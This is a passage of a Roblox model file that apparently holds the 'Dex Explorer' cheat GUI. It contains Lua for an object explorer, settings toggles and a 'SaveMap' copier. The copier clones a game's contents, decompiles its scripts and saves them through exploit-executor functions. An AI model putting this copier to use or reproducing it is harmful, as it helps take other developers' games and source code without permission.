				button.BackgroundTransparency = 0.9
			end
			--Icon(button,over)
			--tipText.Visible = true
		end)
		button.MouseLeave:connect(function()
			button.BackgroundTransparency = 1
			--Icon(button,icon)
			--tipText.Visible = false
		end)

		currentActions = currentActions + 1
		actionButtons[#actionButtons+1] = {Obj = button,Cond = cond}
		QuickButtons[#actionButtons+1] = {Obj = button,Cond = cond, Toggle = function(on)
			if on then
				buttonEnabled = true
				Icon(button,over)
			else
				buttonEnabled = false
				Icon(button,icon)
			end
		end}
		return button
	end

	--local clipboard = {}
	local function delete(o)
		o.Parent = nil
	end
	
	makeButton(ACTION_EDITQUICKACCESS,ACTION_EDITQUICKACCESS,"Options",true,function()return true end).MouseButton1Click:connect(function()
		
	end)
	

	-- DELETE
	makeButton(ACTION_DELETE,ACTION_DELETE_OVER,"Delete",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		local list = Selection:Get()
		for i = 1,#list do
			pcall(delete,list[i])
		end
		Selection:Set({})
	end)
	
	-- PASTE
	makeButton(ACTION_PASTE,ACTION_PASTE_OVER,"Paste",true,function() return #Selection:Get() > 0 and #clipboard > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		local parent = Selection.List[1] or workspace
		for i = 1,#clipboard do
			clipboard[i]:Clone().Parent = parent
		end
	end)
	
	-- COPY
	makeButton(ACTION_COPY,ACTION_COPY_OVER,"Copy",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		clipboard = {}
		local list = Selection.List
		for i = 1,#list do
			table.insert(clipboard,list[i]:Clone())
		end
		updateActions()
	end)
	
	-- CUT
	makeButton(ACTION_CUT,ACTION_CUT_OVER,"Cut",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		clipboard = {}
		local list = Selection.List
		local cut = {}
		for i = 1,#list do
			local obj = list[i]:Clone()
			if obj then
				table.insert(clipboard,obj)
				table.insert(cut,list[i])
			end
		end
		for i = 1,#cut do
			pcall(delete,cut[i])
		end
		updateActions()
	end)
	
	-- FREEZE
	makeButton(ACTION_FREEZE,ACTION_FREEZE,"Freeze",true,function() return true end)
	
	-- ADD/REMOVE STARRED
	makeButton(ACTION_ADDSTAR,ACTION_ADDSTAR_OVER,"Star",true,function() return #Selection:Get() > 0 end)
	
	-- STARRED
	makeButton(ACTION_STARRED,ACTION_STARRED,"Starred",true,function() return true end)


	-- SORT
	-- local actionSort = makeButton(ACTION_SORT,ACTION_SORT_OVER,"Sort")
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Option Bindables

do
	local optionCallback = {
		Modifiable = function(value)
			for i = 1,#actionButtons do
				actionButtons[i].Obj.Visible = value and Option.Selectable
			end
			cancelReparentDrag()
		end;
		Selectable = function(value)
			for i = 1,#actionButtons do
				actionButtons[i].Obj.Visible = value and Option.Modifiable
			end
			cancelSelectDrag()
			Selection:Set({})
		end;
	}

	local bindSetOption = explorerPanel:FindFirstChild("SetOption")
	if not bindSetOption then
		bindSetOption = Create('BindableFunction',{Name = "SetOption"})
		bindSetOption.Parent = explorerPanel
	end

	bindSetOption.OnInvoke = function(optionName,value)
		if optionCallback[optionName] then
			Option[optionName] = value
			optionCallback[optionName](value)
		end
	end

	local bindGetOption = explorerPanel:FindFirstChild("GetOption")
	if not bindGetOption then
		bindGetOption = Create('BindableFunction',{Name = "GetOption"})
		bindGetOption.Parent = explorerPanel
	end

	bindGetOption.OnInvoke = function(optionName)
		if optionName then
			return Option[optionName]
		else
			local options = {}
			for k,v in pairs(Option) do
				options[k] = v
			end
			return options
		end
	end
end

function SelectionVar()
	return Selection
end

Input.InputBegan:connect(function(key)
	if key.KeyCode == Enum.KeyCode.LeftControl then
		HoldingCtrl = true
	end
	if key.KeyCode == Enum.KeyCode.LeftShift then
		HoldingShift = true
	end
end)

Input.InputEnded:connect(function(key)
	if key.KeyCode == Enum.KeyCode.LeftControl then
		HoldingCtrl = false
	end
	if key.KeyCode == Enum.KeyCode.LeftShift then
		HoldingShift = false
	end
end)

while RbxApi == nil do
	RbxApi = GetApiRemote:Invoke()
	wait()
end

explorerFilter.Changed:connect(function(prop)
	if prop == "Text" then
		rawUpdateList()
	end
end)

CurrentInsertObjectWindow = CreateInsertObjectMenu(
	GetClasses(),
	"",
	false,
	function(option)
		CurrentInsertObjectWindow.Visible = false
		local list = SelectionVar():Get()
		for i = 1,#list do
			pcall(function() Instance.new(option,list[i]) end)
		end
		DestroyRightClick()
	end
)]]></ProtectedString>
						</Properties>
					</Item>
				</Item>
				<Item class="LocalScript" referent="RBX6A373939C62A4119BE9B49F1BF997FED">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Selection</string>
						<string name="ScriptGuid"></string>
						<ProtectedString name="Source"><![CDATA[local Gui = script.Parent

local blackList = {
	["About"] = true;
	["SaveMap"] = true;
	["Remotes"] = true;
}

--// Things in the blacklist appear to not work under a normal security level
--// About could work but apparently no window was included for about :(

local IntroFrame = Gui:WaitForChild("IntroFrame")

local SideMenu = Gui:WaitForChild("SideMenu")
local OpenToggleButton = Gui:WaitForChild("Toggle")
local CloseToggleButton = SideMenu:WaitForChild("Toggle")
local OpenScriptEditorButton = SideMenu:WaitForChild("OpenScriptEditor")

local ScriptEditor = Gui:WaitForChild("ScriptEditor")

local SlideOut = SideMenu:WaitForChild("SlideOut")
local SlideFrame = SlideOut:WaitForChild("SlideFrame")
local Slant = SideMenu:WaitForChild("Slant")

local ExplorerButton = SlideFrame:WaitForChild("Explorer")
local SettingsButton = SlideFrame:WaitForChild("Settings")

local SelectionBox = Instance.new("SelectionBox")
SelectionBox.Parent = Gui

local ExplorerPanel = Gui:WaitForChild("ExplorerPanel")
local PropertiesFrame = Gui:WaitForChild("PropertiesFrame")
local SaveMapWindow = Gui:WaitForChild("SaveMapWindow")
local RemoteDebugWindow = Gui:WaitForChild("RemoteDebugWindow")

local SettingsPanel = Gui:WaitForChild("SettingsPanel")
local SettingsListener = SettingsPanel:WaitForChild("GetSetting")
local SettingTemplate = SettingsPanel:WaitForChild("SettingTemplate")
local SettingList = SettingsPanel:WaitForChild("SettingList")

local SaveMapCopyList = SaveMapWindow:WaitForChild("CopyList")
local SaveMapSettingFrame = SaveMapWindow:WaitForChild("MapSettings")
local SaveMapName = SaveMapWindow:WaitForChild("FileName")
local SaveMapButton = SaveMapWindow:WaitForChild("Save")
local SaveMapCopyTemplate = SaveMapWindow:WaitForChild("Entry")
local SaveMapSettings = {
	CopyWhat = {
		Workspace = true,
		Lighting = true,
		ReplicatedStorage = true,
		ReplicatedFirst = true,
		StarterPack = true,
		StarterGui = true,
		StarterPlayer = true
	},
	SaveScripts = true,
	SaveTerrain = true,
	LightingProperties = true,
	CameraInstances = true
}

local Love = IntroFrame:WaitForChild("Love")

local LoveQuotes = {
	"Inspect, our love knows no bounds",
	"Inspect, I will always be there for you",
	"Inspect, nothing is more powerful than our relationship",
	"Inspect, I always think about you when you get depressed",
	"Inspect, you will always have a special place in my heart"
}

Love.Text = LoveQuotes[math.random(1,#LoveQuotes)]

--[[
local ClickSelectOption = SettingsPanel:WaitForChild("ClickSelect"):WaitForChild("Change")
local SelectionBoxOption = SettingsPanel:WaitForChild("SelectionBox"):WaitForChild("Change")
local ClearPropsOption = SettingsPanel:WaitForChild("ClearProperties"):WaitForChild("Change")
local SelectUngroupedOption = SettingsPanel:WaitForChild("SelectUngrouped"):WaitForChild("Change")
--]]

local SelectionChanged = ExplorerPanel:WaitForChild("SelectionChanged")
local GetSelection = ExplorerPanel:WaitForChild("GetSelection")
local SetSelection = ExplorerPanel:WaitForChild("SetSelection")

local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()

local CurrentWindow = "Nothing c:"
local Windows = {
	Explorer = {
		ExplorerPanel,
		PropertiesFrame
	},
	Settings = {SettingsPanel},
	SaveMap = {SaveMapWindow},
	Remotes = {RemoteDebugWindow}
}

for i,v in pairs(Player.PlayerGui:GetChildren()) do
	if v ~= script.Parent and v.Name == "Dex_Explorer" then
		v:Destroy()
	end
end

function switchWindows(wName,over)
	if CurrentWindow == wName and not over then return end
	
	local count = 0
	
	for i,v in pairs(Windows) do
		count = 0
		if i ~= wName then
			for _,c in pairs(v) do c:TweenPosition(UDim2.new(1, 30, count * 0.5, count * 36), "Out", "Quad", 0.5, true) count = count + 1 end
		end
	end
	
	count = 0
	
	if Windows[wName] then
		for _,c in pairs(Windows[wName]) do c:TweenPosition(UDim2.new(1, -300, count * 0.5, count * 36), "Out", "Quad", 0.5, true) count = count + 1 end
	end
	
	if wName ~= "Nothing c:" then
		CurrentWindow = wName
		for i,v in pairs(SlideFrame:GetChildren()) do
			v.BackgroundTransparency = 1
			v.Icon.ImageColor3 = Color3.new(70/255, 70/255, 70/255)
		end
		if SlideFrame:FindFirstChild(wName) then
			SlideFrame[wName].BackgroundTransparency = 0.5
			SlideFrame[wName].Icon.ImageColor3 = Color3.new(0,0,0)
		end
	end
end

function toggleDex(on)
	if on then
		SideMenu:TweenPosition(UDim2.new(1, -330, 0, 0), "Out", "Quad", 0.5, true)
		OpenToggleButton:TweenPosition(UDim2.new(1,0,0,0), "Out", "Quad", 0.5, true)
		switchWindows(CurrentWindow,true)
	else
		SideMenu:TweenPosition(UDim2.new(1, 0, 0, 0), "Out", "Quad", 0.5, true)
		--OpenToggleButton:TweenPosition(UDim2.new(1,-30,0,0), "Out", "Quad", 0.5, true)
		switchWindows("Nothing c:")
		wait(0.6)
		script.Parent:Destroy()
	end
end

local Settings = {
	ClickSelect = false,
	SelBox = false,
	ClearProps = false,
	SelectUngrouped = true,
	SaveInstanceScripts = true
}

function ReturnSetting(set)
	if set == "ClearProps" then
		return Settings.ClearProps
	elseif set == "SelectUngrouped" then
		return Settings.SelectUngrouped
	end
end

OpenToggleButton.MouseButton1Up:connect(function()
	toggleDex(true)
end)

OpenScriptEditorButton.MouseButton1Up:connect(function()
	if OpenScriptEditorButton.Active then
		--ScriptEditor.Visible = true
	end
end)

CloseToggleButton.MouseButton1Up:connect(function()
	if CloseToggleButton.Active then
		toggleDex(false)
	end
end)

--[[
OpenToggleButton.MouseButton1Up:connect(function()
	SideMenu:TweenPosition(UDim2.new(1, -330, 0, 0), "Out", "Quad", 0.5, true)
	
	if CurrentWindow == "Explorer" then
		ExplorerPanel:TweenPosition(UDim2.new(1, -300, 0, 0), "Out", "Quad", 0.5, true)
		PropertiesFrame:TweenPosition(UDim2.new(1, -300, 0.5, 36), "Out", "Quad", 0.5, true)
	else
		SettingsPanel:TweenPosition(UDim2.new(1, -300, 0, 0), "Out", "Quad", 0.5, true)
	end
	
	OpenToggleButton:TweenPosition(UDim2.new(1,0,0,0), "Out", "Quad", 0.5, true)
end)

CloseToggleButton.MouseButton1Up:connect(function()
	SideMenu:TweenPosition(UDim2.new(1, 0, 0, 0), "Out", "Quad", 0.5, true)
	
	ExplorerPanel:TweenPosition(UDim2.new(1, 30, 0, 0), "Out", "Quad", 0.5, true)
	PropertiesFrame:TweenPosition(UDim2.new(1, 30, 0.5, 36), "Out", "Quad", 0.5, true)
	SettingsPanel:TweenPosition(UDim2.new(1, 30, 0, 0), "Out", "Quad", 0.5, true)
	
	OpenToggleButton:TweenPosition(UDim2.new(1,-30,0,0), "Out", "Quad", 0.5, true)
end)
--]]

--[[
ExplorerButton.MouseButton1Up:connect(function()
	switchWindows("Explorer")
end)

SettingsButton.MouseButton1Up:connect(function()
	switchWindows("Settings")
end)
--]]

for i,v in pairs(SlideFrame:GetChildren()) do
	if not blackList[v.Name] then
		v.MouseButton1Click:connect(function()
			switchWindows(v.Name)
		end)
		
		v.MouseEnter:connect(function()v.BackgroundTransparency = 0.5 end)
		v.MouseLeave:connect(function()if CurrentWindow~=v.Name then v.BackgroundTransparency = 1 end end)
	end
end

--[[
ExplorerButton.MouseButton1Up:connect(function()
	if CurrentWindow ~= "Explorer" then
		CurrentWindow = "Explorer"
		
		ExplorerPanel:TweenPosition(UDim2.new(1, -300, 0, 0), "Out", "Quad", 0.5, true)
		PropertiesFrame:TweenPosition(UDim2.new(1, -300, 0.5, 36), "Out", "Quad", 0.5, true)
		SettingsPanel:TweenPosition(UDim2.new(1, 0, 0, 0), "Out", "Quad", 0.5, true)
	end
end)

SettingsButton.MouseButton1Up:connect(function()
	if CurrentWindow ~= "Settings" then
		CurrentWindow = "Settings"
		
		ExplorerPanel:TweenPosition(UDim2.new(1, 0, 0, 0), "Out", "Quad", 0.5, true)
		PropertiesFrame:TweenPosition(UDim2.new(1, 0, 0.5, 36), "Out", "Quad", 0.5, true)
		SettingsPanel:TweenPosition(UDim2.new(1, -300, 0, 0), "Out", "Quad", 0.5, true)
	end
end)
--]]

function createSetting(name,interName,defaultOn)
	local newSetting = SettingTemplate:Clone()
	newSetting.Position = UDim2.new(0,0,0,#SettingList:GetChildren() * 60)
	newSetting.SName.Text = name
	
	local function toggle(on)
		if on then
			newSetting.Change.Bar:TweenPosition(UDim2.new(0,32,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Change.OnBar:TweenSize(UDim2.new(0,34,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Status.Text = "On"
			Settings[interName] = true
		else
			newSetting.Change.Bar:TweenPosition(UDim2.new(0,-2,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Change.OnBar:TweenSize(UDim2.new(0,0,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Status.Text = "Off"
			Settings[interName] = false
		end
	end	
	
	newSetting.Change.MouseButton1Click:connect(function()
		toggle(not Settings[interName])
	end)
	
	newSetting.Visible = true
	newSetting.Parent = SettingList
	
	if defaultOn then
		toggle(true)
	end
end

createSetting("Click part to select","ClickSelect",false)
createSetting("Selection Box","SelBox",false)
createSetting("Clear property value on focus","ClearProps",false)
createSetting("Select ungrouped models","SelectUngrouped",true)
createSetting("SaveInstance decompiles scripts","SaveInstanceScripts",true)

--[[
ClickSelectOption.MouseButton1Up:connect(function()
	if Settings.ClickSelect then
		Settings.ClickSelect = false
		ClickSelectOption.Text = "OFF"
	else
		Settings.ClickSelect = true
		ClickSelectOption.Text = "ON"
	end
end)

SelectionBoxOption.MouseButton1Up:connect(function()
	if Settings.SelBox then
		Settings.SelBox = false
		SelectionBox.Adornee = nil
		SelectionBoxOption.Text = "OFF"
	else
		Settings.SelBox = true
		SelectionBoxOption.Text = "ON"
	end
end)

ClearPropsOption.MouseButton1Up:connect(function()
	if Settings.ClearProps then
		Settings.ClearProps = false
		ClearPropsOption.Text = "OFF"
	else
		Settings.ClearProps = true
		ClearPropsOption.Text = "ON"
	end
end)

SelectUngroupedOption.MouseButton1Up:connect(function()
	if Settings.SelectUngrouped then
		Settings.SelectUngrouped = false
		SelectUngroupedOption.Text = "OFF"
	else
		Settings.SelectUngrouped = true
		SelectUngroupedOption.Text = "ON"
	end
end)
--]]

local function getSelection()
	local t = GetSelection:Invoke()
	if t and #t > 0 then
		return t[1]
	else
		return nil
	end
end

Mouse.Button1Down:connect(function()
	if CurrentWindow == "Explorer" and Settings.ClickSelect then
		local target = Mouse.Target
		if target then
			SetSelection:Invoke({target})
		end
	end
end)

SelectionChanged.Event:connect(function()
	if Settings.SelBox then
		local success,err = pcall(function()
			local selection = getSelection()
			SelectionBox.Adornee = selection
		end)
		if err then
			SelectionBox.Adornee = nil
		end
	end
end)

SettingsListener.OnInvoke = ReturnSetting

-- Map Copier

function createMapSetting(obj,interName,defaultOn)
	local function toggle(on)
		if on then
			obj.Change.Bar:TweenPosition(UDim2.new(0,32,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Change.OnBar:TweenSize(UDim2.new(0,34,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Status.Text = "On"
			SaveMapSettings[interName] = true
		else
			obj.Change.Bar:TweenPosition(UDim2.new(0,-2,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Change.OnBar:TweenSize(UDim2.new(0,0,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Status.Text = "Off"
			SaveMapSettings[interName] = false
		end
	end	
	
	obj.Change.MouseButton1Click:connect(function()
		toggle(not SaveMapSettings[interName])
	end)
	
	obj.Visible = true
	obj.Parent = SaveMapSettingFrame
	
	if defaultOn then
		toggle(true)
	end
end

function createCopyWhatSetting(serv)
	if SaveMapSettings.CopyWhat[serv] then
		local newSetting = SaveMapCopyTemplate:Clone()
		newSetting.Position = UDim2.new(0,0,0,#SaveMapCopyList:GetChildren() * 22 + 5)
		newSetting.Info.Text = serv
		
		local function toggle(on)
			if on then
				newSetting.Change.enabled.Visible = true
				SaveMapSettings.CopyWhat[serv] = true
			else
				newSetting.Change.enabled.Visible = false
				SaveMapSettings.CopyWhat[serv] = false
			end
		end	
	
		newSetting.Change.MouseButton1Click:connect(function()
			toggle(not SaveMapSettings.CopyWhat[serv])
		end)
		
		newSetting.Visible = true
		newSetting.Parent = SaveMapCopyList
	end
end

createMapSetting(SaveMapSettingFrame.Scripts,"SaveScripts",true)
createMapSetting(SaveMapSettingFrame.Terrain,"SaveTerrain",true)
createMapSetting(SaveMapSettingFrame.Lighting,"LightingProperties",true)
createMapSetting(SaveMapSettingFrame.CameraInstances,"CameraInstances",true)

createCopyWhatSetting("Workspace")
createCopyWhatSetting("Lighting")
createCopyWhatSetting("ReplicatedStorage")
createCopyWhatSetting("ReplicatedFirst")
createCopyWhatSetting("StarterPack")
createCopyWhatSetting("StarterGui")
createCopyWhatSetting("StarterPlayer")

SaveMapName.Text = tostring(game.PlaceId).."MapCopy"

SaveMapButton.MouseButton1Click:connect(function()
	local copyWhat = {}

	local copyGroup = Instance.new("Model",game.ReplicatedStorage)

	local copyScripts = SaveMapSettings.SaveScripts

	local copyTerrain = SaveMapSettings.SaveTerrain

	local lightingProperties = SaveMapSettings.LightingProperties

	local cameraInstances = SaveMapSettings.CameraInstances

	-----------------------------------------------------------------------------------

	for i,v in pairs(SaveMapSettings.CopyWhat) do
		if v then
			table.insert(copyWhat,i)
		end
	end

	local consoleFunc = printconsole or writeconsole

	if consoleFunc then
		consoleFunc("Raspberry Pi's place copier loaded.")
		consoleFunc("Copying map of game "..tostring(game.PlaceId)..".")
	end

	function archivable(root)
		for i,v in pairs(root:GetChildren()) do
			if not game.Players:GetPlayerFromCharacter(v) then
				v.Archivable = true
				archivable(v)
			end
		end
	end

	function decompileS(root)
		for i,v in pairs(root:GetChildren()) do
			pcall(function()
				if v:IsA("LocalScript") then
					local isDisabled = v.Disabled
					v.Disabled = true
					v.Source = decompile(v)
					v.Disabled = isDisabled
				
					if v.Source == "" then 
						if consoleFunc then consoleFunc("LocalScript "..v.Name.." had a problem decompiling.") end
					else
						if consoleFunc then consoleFunc("LocalScript "..v.Name.." decompiled.") end
					end
				elseif v:IsA("ModuleScript") then
					v.Source = decompile(v)
				
					if v.Source == "" then 
						if consoleFunc then consoleFunc("ModuleScript "..v.Name.." had a problem decompiling.") end
					else
						if consoleFunc then consoleFunc("ModuleScript "..v.Name.." decompiled.") end
					end
				end
			end)
			decompileS(v)
		end
	end

	for i,v in pairs(copyWhat) do archivable(game[v]) end

	for j,obj in pairs(copyWhat) do
		if obj ~= "StarterPlayer" then
			local newFolder = Instance.new("Folder",copyGroup)
			newFolder.Name = obj
			for i,v in pairs(game[obj]:GetChildren()) do
				if v ~= copyGroup then
					pcall(function()
						v:Clone().Parent = newFolder
					end)
				end
			end
		else
			local newFolder = Instance.new("Model",copyGroup)
			newFolder.Name = "StarterPlayer"
			for i,v in pairs(game[obj]:GetChildren()) do
				local newObj = Instance.new("Folder",newFolder)
				newObj.Name = v.Name
				for _,c in pairs(v:GetChildren()) do
					if c.Name ~= "ControlScript" and c.Name ~= "CameraScript" then
						c:Clone().Parent = newObj
					end
				end
			end
		end
	end

	if workspace.CurrentCamera and cameraInstances then
		local cameraFolder = Instance.new("Model",copyGroup)
		cameraFolder.Name = "CameraItems"
		for i,v in pairs(workspace.CurrentCamera:GetChildren()) do v:Clone().Parent = cameraFolder end
	end

	if copyTerrain then
		local myTerrain = workspace.Terrain:CopyRegion(workspace.Terrain.MaxExtents)
		myTerrain.Parent = copyGroup
	end

	function saveProp(obj,prop,par)
		local myProp = obj[prop]
		if type(myProp) == "boolean" then
			local newProp = Instance.new("BoolValue",par)
			newProp.Name = prop
			newProp.Value = myProp
		elseif type(myProp) == "number" then
			local newProp = Instance.new("IntValue",par)
			newProp.Name = prop
			newProp.Value = myProp
		elseif type(myProp) == "string" then
			local newProp = Instance.new("StringValue",par)
			newProp.Name = prop
			newProp.Value = myProp
		elseif type(myProp) == "userdata" then -- Assume Color3
			pcall(function()
				local newProp = Instance.new("Color3Value",par)
				newProp.Name = prop
				newProp.Value = myProp
			end)
		end
	end

	if lightingProperties then
		local lightingProps = Instance.new("Model",copyGroup)
		lightingProps.Name = "LightingProperties"
	
		saveProp(game.Lighting,"Ambient",lightingProps)
		saveProp(game.Lighting,"Brightness",lightingProps)
		saveProp(game.Lighting,"ColorShift_Bottom",lightingProps)
		saveProp(game.Lighting,"ColorShift_Top",lightingProps)
		saveProp(game.Lighting,"GlobalShadows",lightingProps)
		saveProp(game.Lighting,"OutdoorAmbient",lightingProps)
		saveProp(game.Lighting,"Outlines",lightingProps)
		saveProp(game.Lighting,"GeographicLatitude",lightingProps)
		saveProp(game.Lighting,"TimeOfDay",lightingProps)
		saveProp(game.Lighting,"FogColor",lightingProps)
		saveProp(game.Lighting,"FogEnd",lightingProps)
		saveProp(game.Lighting,"FogStart",lightingProps)
	end

	if decompile and copyScripts then
		decompileS(copyGroup)
	end

	if SaveInstance then
		SaveInstance(copyGroup,SaveMapName.Text..".rbxm")
	elseif saveinstance then
		saveinstance(getelysianpath()..SaveMapName.Text..".rbxm",copyGroup)
	end
	--print("Saved!")
	if consoleFunc then
		consoleFunc("The map has been copied.")
	end
	SaveMapButton.Text = "The map has been saved"
	wait(5)
	SaveMapButton.Text = "Save"
end)

-- End Copier

wait()

IntroFrame:TweenPosition(UDim2.new(1,-300,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)

switchWindows("Explorer")

wait(1)

SideMenu.Visible = true

for i = 0,1,0.1 do
	IntroFrame.BackgroundTransparency = i
	IntroFrame.Main.BackgroundTransparency = i
	IntroFrame.Slant.ImageTransparency = i
	IntroFrame.Title.TextTransparency = i
	IntroFrame.Version.TextTransparency = i
	IntroFrame.Creator.TextTransparency = i
	IntroFrame.Love.TextTransparency = i
	IntroFrame.Sad.ImageTransparency = i
	IntroFrame.Sad2.ImageTransparency = i
	wait()
end

IntroFrame.Visible = false

SlideFrame:TweenPosition(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
OpenScriptEditorButton:TweenPosition(UDim2.new(0,0,0,180),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
CloseToggleButton:TweenPosition(UDim2.new(0,0,0,210),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
Slant:TweenPosition(UDim2.new(0,0,0,240),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)

wait(0.5)

for i = 1,0,-0.1 do
	OpenScriptEditorButton.Icon.ImageTransparency = i
	CloseToggleButton.TextTransparency = i
	wait()
end

CloseToggleButton.Active = true
CloseToggleButton.AutoButtonColor = true

OpenScriptEditorButton.Active = true
OpenScriptEditorButton.AutoButtonColor = true]]></ProtectedString>
					</Properties>
				</Item>
				<Item class="Frame" referent="RBX01BA7FC8CF96478BAFAB13C65819CEF8">
					<Properties>
						<bool name="Active">false</bool>
						<Vector2 name="AnchorPoint">
							<X>0</X>
							<Y>0</Y>
						</Vector2>
						<Color3 name="BackgroundColor3">4293519849</Color3>
						<float name="BackgroundTransparency">1</float>
						<Color3 name="BorderColor3">4287993237</Color3>
						<int name="BorderSizePixel">0</int>
						<bool name="ClipsDescendants">false</bool>
						<bool name="Draggable">false</bool>
						<string name="Name">SideMenu</string>
						<Ref name="NextSelectionDown">null</Ref>
						<Ref name="NextSelectionLeft">null</Ref>
						<Ref name="NextSelectionRight">null</Ref>
						<Ref name="NextSelectionUp">null</Ref>
						<UDim2 name="Position">
							<XS>1</XS>
							<XO>-330</XO>
							<YS>0</YS>
							<YO>0</YO>
						</UDim2>
						<float name="Rotation">0</float>
						<bool name="Selectable">false</bool>
						<Ref name="SelectionImageObject">null</Ref>
						<UDim2 name="Size">
							<XS>0</XS>
							<XO>30</XO>
							<YS>0</YS>
							<YO>180</YO>
						</UDim2>
						<token name="SizeConstraint">0</token>
						<token name="Style">0</token>
						<bool name="Visible">false</bool>
						<int name="ZIndex">2</int>
					</Properties>
					<Item class="TextButton" referent="RBXC2FD15BA1BCA455D847FC346C4D82654">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<bool name="AutoButtonColor">false</bool>
							<Color3 name="BackgroundColor3">4293519849</Color3>
							<float name="BackgroundTransparency">0</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">0</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">3</token>
							<token name="FontSize">7</token>
							<bool name="Modal">false</bool>
							<string name="Name">Toggle</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>60</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">true</bool>
							<bool name="Selected">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>30</XO>
								<YS>0</YS>
								<YO>30</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<string name="Text">&gt;</string>
							<Color3 name="TextColor3">4279970357</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">24</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">1</float>
							<bool name="TextWrapped">true</bool>
							<token name="TextXAlignment">2</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
					</Item>
					<Item class="TextLabel" referent="RBX3357561D4DB94C51A6A5396BAA7894CD">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">4</token>
							<token name="FontSize">5</token>
							<string name="Name">Title</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>30</XO>
								<YS>0</YS>
								<YO>20</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<string name="Text">DEX</string>
							<Color3 name="TextColor3">4279970357</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">14</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">true</bool>
							<token name="TextXAlignment">2</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">2</int>
						</Properties>
					</Item>
					<Item class="TextLabel" referent="RBX4E38F1A976534CB3AC89CF9F1A402B18">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">4</token>
							<token name="FontSize">4</token>
							<string name="Name">Version</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>15</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>30</XO>
								<YS>0</YS>
								<YO>20</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<string name="Text">V1.0.0</string>
							<Color3 name="TextColor3">4279970357</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">12</float>
